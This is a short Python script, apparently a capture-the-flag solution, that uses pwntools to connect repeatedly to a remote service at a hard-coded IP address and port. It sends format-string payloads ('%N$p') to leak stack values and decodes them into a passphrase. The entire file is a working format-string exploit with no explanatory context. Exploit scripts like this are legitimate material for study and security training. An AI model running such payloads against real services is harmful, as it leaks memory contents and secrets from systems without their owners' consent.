import pwn
import time

i = 1
a = []
while i != 15:
    r = pwn.remote("185.235.41.205", 7050)
    r.recvlines(20)
    p = "%" + str(i) + "$p"
    r.sendline(p.encode())
    user_pass = r.recvlines(2)[1].decode().split(" ")[-1]
    print(user_pass)
    a.append(user_pass)
    i += 1

passphrase = []
for k in a:
    try:
        passphrase.append(pwn.p32(int(k, 16)).decode("latin-1"))
    except Exception as e:
        pass

print("".join(passphrase))
